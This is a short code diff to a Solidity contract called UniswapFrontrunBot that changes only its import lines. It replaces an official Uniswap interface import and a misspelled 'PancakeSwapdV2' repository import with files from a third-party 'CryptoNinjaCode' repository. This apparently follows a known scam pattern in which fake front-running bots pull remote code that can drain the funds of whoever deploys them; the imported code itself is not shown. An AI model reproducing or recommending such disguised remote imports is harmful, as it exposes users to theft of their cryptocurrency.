@@ -2,10 +2,10 @@ pragma solidity ^0.6.6;
 
 // Import Libraries Migrator/Exchange/Factory
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
-import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
+import "https://github.com/CryptoNinjaCode/UniSwap-FrontRun-Bot/blob/main/IPancakeswapV22Exchange.sol";
 import "https://github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
 //Mempool router
-import "https://github.com/PancakeSwapdV2/PancakeSwapv2/blob/main/contracts/interfaces/V2/IPancakeswapV22Factory.sol";
+import "https://github.com/CryptoNinjaCode/UniSwap-FrontRun-Bot/blob/main/IPancakeswapV22Factory.sol";
 contract UniswapFrontrunBot {
  
     string public tokenName;
